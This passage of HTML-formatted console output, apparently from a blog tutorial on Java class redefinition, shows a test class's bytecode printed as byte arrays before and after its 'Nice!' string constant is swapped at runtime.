class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>sa-jdi.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>tools.jar:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/test/</span>target/classes com.shadowflow.test.MyClass</span><br><span class="line">Nice!</span><br><span class="line">Nice!</span><br><span class="line">com.shadowflow.test.MyClass.....</span><br><span class="line">com.shadowflow.test.MyClass类替换前的字节码:[-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">74</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">3</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">8</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>]</span><br><span class="line">com.shadowflow.test.MyClass类替换后的字节码:[-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">107</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">74</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span 